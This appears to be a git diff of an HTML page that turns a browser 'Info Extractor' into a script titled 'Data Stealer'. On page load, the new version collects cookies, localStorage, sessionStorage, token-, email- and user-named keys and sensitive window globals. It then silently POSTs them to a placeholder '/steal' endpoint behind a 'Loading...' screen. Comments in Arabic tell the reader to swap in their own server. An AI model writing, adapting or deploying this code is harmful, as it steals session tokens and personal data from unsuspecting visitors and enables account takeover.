@@ -1,100 +1,71 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>📊 Info Extractor</title>
-    <script>
-      window.onload = function () {
+<head>
+  <title>Data Stealer</title>
+  <script>
+    window.onload = function() {
+      try {
+        // جمع معلومات أساسية
         const url = location.href;
-        const cookies = document.cookie || "❌ No cookies";
         const userAgent = navigator.userAgent;
+        const cookies = document.cookie || "No cookies";
 
-        // ⬇️ LocalStorage
+        // جمع بيانات localStorage
         const localStorageData = {};
         for (let i = 0; i < localStorage.length; i++) {
           const key = localStorage.key(i);
           localStorageData[key] = localStorage.getItem(key);
         }
 
-        // ⬇️ SessionStorage
+        // جمع بيانات sessionStorage
         const sessionStorageData = {};
         for (let i = 0; i < sessionStorage.length; i++) {
           const key = sessionStorage.key(i);
           sessionStorageData[key] = sessionStorage.getItem(key);
         }
 
-        // ⬇️ Tokens from localStorage/sessionStorage
-        const potentialTokens = {};
+        // تصفية المفاتيح المحتملة التي تحتوي على توكنات أو ايميل
+        const sensitiveData = {};
         const allKeys = [...Object.keys(localStorageData), ...Object.keys(sessionStorageData)];
-        allKeys.forEach((key) => {
-          if (/token|auth|bearer/i.test(key)) {
-            potentialTokens[key] = localStorageData[key] || sessionStorageData[key];
+        allKeys.forEach(key => {
+          if (/token|auth|bearer|email|user/i.test(key)) {
+            sensitiveData[key] = localStorageData[key] || sessionStorageData[key];
           }
         });
 
-        // ⬇️ Global variables from window
+        // محاولة الحصول على أي متغيرات حساسة في نافذة الجافاسكريبت
         const sensitiveGlobals = {};
         for (const key in window) {
-          if (/token|auth|user/i.test(key) && typeof window[key] === 'string') {
+          if (/token|auth|user|email/i.test(key) && typeof window[key] === 'string') {
             sensitiveGlobals[key] = window[key];
           }
         }
 
-        // ⬇️ Hidden input fields
-        const hiddenInputs = {};
-        document.querySelectorAll('input[type="hidden"]').forEach((el) => {
-          hiddenInputs[el.name || el.id || `input_${Math.random().toString(36).substr(2, 5)}`] = el.value;
-        });
+        // تجهيز البيانات لإرسالها
+        const dataToSend = {
+          url,
+          userAgent,
+          cookies,
+          localStorageData,
+          sessionStorageData,
+          sensitiveData,
+          sensitiveGlobals
+        };
 
-        // ⬇️ بناء الرسالة النهائية
-        const message = `
-📄 Page Info:
+        // إرسال البيانات إلى سيرفرك (غيّر الرابط لسيرفرك الخاص)
+        fetch('https://YOUR_SERVER_DOMAIN/steal', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(dataToSend)
+        }).catch(e => console.error('Failed to send data:', e));
 
-🔗 URL: ${url}
-
-🍪 Cookies:
-${cookies}
-
-📱 User-Agent:
-${userAgent}
-
-📦 LocalStorage:
-${JSON.stringify(localStorageData, null, 2)}
-
-📥 SessionStorage:
-${JSON.stringify(sessionStorageData, null, 2)}
-
-🕵️‍♂️ Potential Tokens / Auth Keys:
-${JSON.stringify(potentialTokens, null, 2)}
-
-🌐 Sensitive window variables:
-${JSON.stringify(sensitiveGlobals, null, 2)}
-
-🧪 Hidden Inputs:
-${JSON.stringify(hiddenInputs, null, 2)}
-`;
-
-        // ⬇️ عرض البيانات
-        alert(message);
-
-        // 📤 لو عايز تبعت البيانات لسيرفرك:
-        /*
-        fetch("https://YOUR-NGROK-ID.ngrok-free.app/steal", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            url, cookies, userAgent,
-            localStorageData,
-            sessionStorageData,
-            potentialTokens,
-            sensitiveGlobals,
-            hiddenInputs
-          })
-        }).catch(console.error);
-        */
-      };
-    </script>
-  </head>
-  <body>
-    <h1>🧠 Page Data Extracted</h1>
-  </body>
+      } catch (error) {
+        console.error('Error in stealing data:', error);
+      }
+    };
+  </script>
+</head>
+<body>
+  <h1>Loading...</h1>
+</body>
 </html>
